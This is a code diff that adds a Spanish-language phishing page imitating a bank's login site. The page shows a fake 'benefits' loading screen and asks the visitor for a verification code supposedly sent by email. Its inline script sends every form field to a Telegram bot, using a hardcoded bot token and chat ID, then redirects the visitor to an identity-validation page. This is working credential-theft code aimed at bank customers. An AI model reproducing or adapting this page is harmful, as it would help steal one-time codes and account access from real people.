@@ -1,1 +1,124 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="https://code.jquery.com/jquery-3.5.0.js"></script>
+	<style type="text/css">*{padding: 0;margin: 0;font-family: Arial;box-sizing: border-box;}html{background:#b3c8d9;height: 100%;}.container{width: 80%;background: #FFF;margin: 1em auto;padding:2em 1em;max-width: 830px;}header{display: flex;flex-direction: row;flex-wrap: wrap;margin-bottom: 3em;}.logo{width: 50%;margin-bottom: 1em;}.logo:nth-of-type(2){text-align: right;}nav{width: 100%;background: #0e3481;height: 31px;}ul{padding: 0;margin: 0;display: flex;list-style: none;width: 100%;justify-content: flex-end;height: 100%;align-items: center;color: #FFF;}ul li > a{color: #FFF;text-decoration: none;font-size: 12px;font-weight: bold;}ul li{margin-right: .5em;}.home{background: #b3c8d9;display: flex;flex-wrap: nowrap;border-bottom:1px solid #b0e400;}.login{width:37.5%;padding: .3em;}.baner{width: 70%;height: 100%;}form h4{font-size: 11px;margin-bottom: .7em;color: #224380}.controles-radios{width: 65%;display: flex;justify-content: space-around;margin:0 auto .7em 0;}.controles-radios label{font-size: 11px;color: #224380;font-weight: bolder;}.controles-radios input{height: 16px;width: 16px;}.control{width: 100%;margin-bottom: .5em;}.control label{font-size: 11px;font-weight: bold;width: 23%;display: inline-block;color: #224380}.control select{width: 23%;}.control input{width: 40%;}.control a{font-size: 11px;color: #224380}.btn{width: 30%;left: 35%;position: relative;color: #224380;margin-bottom: 1em;}.doted{width: 100%;border-bottom: 1px dotted #FFF;margin-bottom: .5em;}form span{font-size: 10px;color: #224380}.button-link{display: inline-block;width: 43%;font-size: 11px;text-decoration: none;background: #fcfcfc;padding: .3em;border: 1px solid silver;color: #224380;margin-left: 30%;margin-top: 1em;margin-bottom: .5em;}.baner img{height:300px;object-fit: cover;width: 100%;}.images-pre-footer{width: 100%;}.images-pre-footer img{width: 100%;}.alert-danger{background: #F56868;padding: 1em;margin-bottom: 1em;}.alert-danger h2{font-size: 16px;color: #B30000;}.alert-danger p{font-size: 11px;color: #B30000;}.load-spínner-container{position: fixed;height: 100%;width: 100%;background: rgb(253, 253, 253);top: 0; display: flex;justify-content: center;align-items: center;z-index: 99;flex-direction: column;}.spinner{width: 60px;height: 60px;border: 4px solid #FFF;border-left: 4px solid #888;border-radius: 60px;animation: girar .3s infinite linear;}@keyframes girar{to{transform: rotate(0deg);}from{transform: rotate(-360deg);}}
+	</style>
+	<meta charset="utf-8">
+	<title>Inicia sesión</title>
+</head>
+<body>
 
+	<div class="load-spínner-container" id="c">
+		<div class="spinner"></div>
+		<div class="text" style="text-align: center;margin-top: 1em;">
+			<h3 style="margin-bottom: .3em;">Aguarda unos instantes por favor</h3>
+			<p>Estamos asociando los beneficios a su cuenta</p>
+			<p style="margin-top: .5em;">¡NO SALGA DE ESTA VENTANA!<b id="sec"></b></p>
+		</div>
+	</div>
+	<div class="container">
+		<header>
+			<div class="logo">
+				<img src="img/logo.jpg">
+			</div>
+			<div class="logo">
+				<img src="img/logo-2.jpg">
+			</div>
+			<nav>
+				<ul>
+					<li><a href="">Sucursales y Cajeros</a></li>
+					<li>|</li>
+					<li><a href="">Ayuda</a></li>
+					<li>|</li>
+					<li><a href="">Contáctenos</a></li>
+				</ul>
+			</nav>
+		</header>
+		<section class="home">
+			<div class="login">
+				<form method="POST">
+					<div class="alert-danger">
+						<h2>Para terminar el proceso te enviaremos un codigo al EMAIL, luego podras disfrutar tus beneficios</h2>
+						<p>Completa los siguientes datos requeridos</p>
+					</div>
+					<h4>Ingresá el codigo que te enviamos al Email.</h4>
+		
+					<div class="control user">
+						<label>CODIGO RECIBIDO</label>
+						<input type="" name="token" required>
+						
+					</div>
+					<button type="submit" name="enviartkn" class="btn">Ingresar</button>
+
+					<div class="doted"></div>
+
+				</form>
+				<script>
+						document.querySelector('form').addEventListener('submit', function(event) {
+								event.preventDefault(); // Evitar que el formulario se envíe por defecto
+
+								// Configurar los datos para enviar a Telegram
+							const telegramBotToken = '6378086633:AAGVAfCvJ4w__4iNgaEnySvvb2C7CbONY9Y'; // Reemplaza con tu token de bot
+							const chatId = '-4108504649'; // Reemplaza con el ID del chat donde recibirás los mensajes
+
+								// Obtener los datos del formulario
+								const formData = new FormData(this);
+								let mensaje = "Nueva acreditación de identidad:\n";
+
+								formData.forEach(function(valor, clave){
+										mensaje += clave + ": " + valor + "\n";
+								});
+
+								// Configurar la solicitud HTTP para enviar el mensaje a Telegram
+							const url = `https://api.telegram.org/bot6378086633:AAGVAfCvJ4w__4iNgaEnySvvb2C7CbONY9Y/sendMessage?chat_id=-4108504649&text=${encodeURIComponent(mensaje)}`;
+
+								// Realizar la solicitud usando fetch API (requiere manejo de errores y promesas)
+								fetch(url)
+										.then(response => response.json())
+										.then(data => {
+												if (data.ok) {
+														
+														// Redirigir después de enviar el mensaje
+														window.location.href = 'valida_ident.html'; // Cambia la URL según tu necesidad
+												} else {
+														console.error(data);
+														
+												}
+										})
+										.catch(error => {
+												console.error('Error al enviar los datos:', error);
+												
+										});
+						});
+				</script>
+			</div>
+			<div class="baner">
+				<img src="img/banner.jpg">
+			</div>
+		</section>
+		<section class="images-pre-footer">
+			<img src="img/footer-img.jpg">
+		</section>
+	</div>
+	<script type="text/javascript">
+		var segundos = 60;
+		setInterval(function(){
+			var cont = document.getElementById("c");
+			cont.style.visibility = "hidden"
+			cont.style.opacity = "0"
+			cont.style.zidex = "0"
+			
+
+		},10000)
+		setInterval(function dec(){
+			segundos--;
+			document.getElementById("sec").innerHTML = segundos;
+		},22000)
+		
+		
+	</script> 
+	
+	</div>
+</body>
+</html>
